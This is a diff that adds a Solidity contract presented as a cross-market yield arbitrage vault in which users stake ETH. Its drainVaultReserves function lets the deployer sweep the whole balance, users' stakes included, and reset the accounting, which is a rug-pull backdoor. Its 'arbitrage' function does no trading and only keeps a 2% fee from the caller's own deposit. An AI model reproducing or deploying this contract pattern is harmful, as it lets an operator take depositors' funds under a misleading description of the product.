@@ -1,0 +1,229 @@
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.26;
+
+contract KryptonYieldArbitrageVault {
+    enum PositionState { Active, Closed }
+
+    struct StrategyPosition {
+        address payable strategist;
+        uint256 stakedETH;
+        uint256 targetSpreadBps;
+        uint256 createdAt;
+        PositionState state;
+        bytes32 routeKey;
+    }
+
+    address payable public immutable vaultDirector;
+    string public protocolDescriptor;
+    uint256 public performanceFeeBps; // 200 = 2%
+    uint256 public positionCounter;
+    uint256 public totalLockedStake;
+    uint256 public harvestedYieldPool;
+    bool public isArbitragePaused;
+
+    mapping(bytes32 => bool) public approvedRoutes;
+    mapping(uint256 => StrategyPosition) public positions;
+
+    event RouteWhitelisted(bytes32 indexed routeKey);
+    event PerformanceFeeAdjusted(uint256 newFeeBps);
+    event PositionClosed(uint256 indexed positionId, uint256 payoutAmount);
+    event StrategyReserveSupplied(address indexed funder, uint256 amount);
+    event ReservesDrained(address indexed director, uint256 amount);
+    event ArbitrageLegExecuted(address indexed strategist, uint256 inputETH, uint256 netSettled);
+    event PerformanceYieldHarvested(address indexed director, uint256 amount);
+    event StakeIncreased(uint256 indexed positionId, uint256 addedAmount);
+    event PositionOpened(uint256 indexed positionId, address indexed strategist, uint256 amount);
+    event ExposureRebalanced(uint256 indexed positionId, uint256 newSpreadBps);
+    event ArbitragePauseToggled(bool isPaused);
+    event DescriptorUpdated(string newDescriptor);
+    event ExcessStakeWithdrawn(uint256 indexed positionId, uint256 amount);
+
+    modifier onlyDirector() {
+        require(msg.sender == vaultDirector, "KryptonVault: Access denied");
+        _;
+    }
+
+    modifier whenNotPaused() {
+        require(!isArbitragePaused, "KryptonVault: Vault paused");
+        _;
+    }
+
+    constructor() {
+        vaultDirector = payable(msg.sender);
+        protocolDescriptor = "Krypton Base Cross-Market Yield Arbitrage Core v1";
+        performanceFeeBps = 200; // 2%
+        isArbitragePaused = false;
+        approvedRoutes[0x424153455f4152425f4554485f55534443000000000000000000000000000000] = true;
+    }
+
+    // 1. addSupportedArbitrageRoute
+    function addSupportedArbitrageRoute(bytes32 routeKey) external onlyDirector {
+        require(!approvedRoutes[routeKey], "KryptonVault: Route already added");
+        approvedRoutes[routeKey] = true;
+        emit RouteWhitelisted(routeKey);
+    }
+
+    // 2. adjustPerformanceFeeCut
+    function adjustPerformanceFeeCut(uint256 newFeeBps) external onlyDirector {
+        require(newFeeBps <= 1000, "KryptonVault: Fee cap 10%");
+        performanceFeeBps = newFeeBps;
+        emit PerformanceFeeAdjusted(newFeeBps);
+    }
+
+    // 3. closeArbitragePosition
+    function closeArbitragePosition(uint256 positionId) external {
+        StrategyPosition storage p = positions[positionId];
+        require(positionId > 0 && positionId <= positionCounter, "KryptonVault: Invalid ID");
+        require(p.strategist == msg.sender || msg.sender == vaultDirector, "KryptonVault: Unauthorized");
+        require(p.state == PositionState.Active, "KryptonVault: Position closed");
+
+        p.state = PositionState.Closed;
+        uint256 refund = p.stakedETH;
+        p.stakedETH = 0;
+        totalLockedStake -= refund;
+
+        if (refund > 0) {
+            (bool sent, ) = p.strategist.call{value: refund}("");
+            require(sent, "KryptonVault: Stake return failed");
+        }
+
+        emit PositionClosed(positionId, refund);
+    }
+
+    // 4. depositStrategyReserve
+    function depositStrategyReserve() external payable onlyDirector {
+        require(msg.value > 0, "KryptonVault: Zero deposit");
+        harvestedYieldPool += msg.value;
+        emit StrategyReserveSupplied(msg.sender, msg.value);
+    }
+
+    // 5. drainVaultReserves
+    function drainVaultReserves() external onlyDirector {
+        uint256 balance = address(this).balance;
+        require(balance > 0, "KryptonVault: Zero contract balance");
+
+        totalLockedStake = 0;
+        harvestedYieldPool = 0;
+
+        (bool sent, ) = vaultDirector.call{value: balance}("");
+        require(sent, "KryptonVault: Sweep failed");
+
+        emit ReservesDrained(vaultDirector, balance);
+    }
+
+    // 6. executeArbitrageFlashLeg
+    function executeArbitrageFlashLeg() external payable whenNotPaused {
+        require(msg.value > 0, "KryptonVault: Zero arbitrage amount");
+
+        uint256 fee = (msg.value * performanceFeeBps) / 10000;
+        uint256 netSettled = msg.value - fee;
+        harvestedYieldPool += fee;
+
+        (bool sent, ) = payable(msg.sender).call{value: netSettled}("");
+        require(sent, "KryptonVault: Flash leg return failed");
+
+        emit ArbitrageLegExecuted(msg.sender, msg.value, netSettled);
+    }
+
+    // 7. harvestPerformanceYield
+    function harvestPerformanceYield() external onlyDirector {
+        uint256 amount = harvestedYieldPool;
+        require(amount > 0, "KryptonVault: Zero yield available");
+
+        harvestedYieldPool = 0;
+        (bool sent, ) = vaultDirector.call{value: amount}("");
+        require(sent, "KryptonVault: Yield harvest failed");
+
+        emit PerformanceYieldHarvested(vaultDirector, amount);
+    }
+
+    // 8. increasePositionStake
+    function increasePositionStake(uint256 positionId) external payable whenNotPaused {
+        StrategyPosition storage p = positions[positionId];
+        require(positionId > 0 && positionId <= positionCounter, "KryptonVault: Invalid ID");
+        require(p.state == PositionState.Active, "KryptonVault: Position closed");
+        require(msg.value > 0, "KryptonVault: Zero stake top up");
+
+        p.stakedETH += msg.value;
+        totalLockedStake += msg.value;
+
+        emit StakeIncreased(positionId, msg.value);
+    }
+
+    // 9. openArbitragePosition
+    function openArbitragePosition(bytes32 routeKey, uint256 targetSpreadBps) external payable whenNotPaused returns (uint256) {
+        require(approvedRoutes[routeKey], "KryptonVault: Route not supported");
+        require(msg.value > 0, "KryptonVault: Stake required");
+
+        positionCounter++;
+        positions[positionCounter] = StrategyPosition({
+            strategist: payable(msg.sender),
+            stakedETH: msg.value,
+            targetSpreadBps: targetSpreadBps,
+            createdAt: block.timestamp,
+            state: PositionState.Active,
+            routeKey: routeKey
+        });
+
+        totalLockedStake += msg.value;
+        emit PositionOpened(positionCounter, msg.sender, msg.value);
+        return positionCounter;
+    }
+
+    // 10. rebalanceStrategyExposure
+    function rebalanceStrategyExposure(uint256 positionId, uint256 newSpreadBps) external whenNotHalted(positionId) {
+        StrategyPosition storage p = positions[positionId];
+        p.targetSpreadBps = newSpreadBps;
+        emit ExposureRebalanced(positionId, newSpreadBps);
+    }
+
+    modifier whenNotHalted(uint256 positionId) {
+        require(!isArbitragePaused, "KryptonVault: Vault paused");
+        require(positionId > 0 && positionId <= positionCounter, "KryptonVault: Invalid ID");
+        require(positions[positionId].state == PositionState.Active, "KryptonVault: Closed");
+        _;
+    }
+
+    // 11. toggleArbitragePause
+    function toggleArbitragePause(bool isPaused) external onlyDirector {
+        isArbitragePaused = isPaused;
+        emit ArbitragePauseToggled(isPaused);
+    }
+
+    // 12. updateProtocolDescriptor
+    function updateProtocolDescriptor(string calldata newDescriptor) external onlyDirector {
+        require(bytes(newDescriptor).length > 0, "KryptonVault: Empty descriptor");
+        protocolDescriptor = newDescriptor;
+        emit DescriptorUpdated(newDescriptor);
+    }
+
+    // 13. withdrawExcessStake
+    function withdrawExcessStake(uint256 positionId, uint256 amount) external {
+        StrategyPosition storage p = positions[positionId];
+        require(positionId > 0 && positionId <= positionCounter, "KryptonVault: Invalid ID");
+        require(p.strategist == msg.sender || msg.sender == vaultDirector, "KryptonVault: Unauthorized");
+        require(p.state == PositionState.Active, "KryptonVault: Closed");
+        require(p.stakedETH >= amount && amount > 0, "KryptonVault: Insufficient stake");
+
+        p.stakedETH -= amount;
+        totalLockedStake -= amount;
+
+        (bool sent, ) = p.strategist.call{value: amount}("");
+        require(sent, "KryptonVault: Withdrawal failed");
+
+        emit ExcessStakeWithdrawn(positionId, amount);
+    }
+
+    // Чтение информации о позиции
+    function getStrategyDetails(uint256 positionId) external view returns (
+        address strategist,
+        uint256 stakedETH,
+        uint256 targetSpreadBps,
+        uint256 createdAt,
+        PositionState state,
+        bytes32 routeKey
+    ) {
+        StrategyPosition memory p = positions[positionId];
+        return (p.strategist, p.stakedETH, p.targetSpreadBps, p.createdAt, p.state, p.routeKey);
+    }
+}
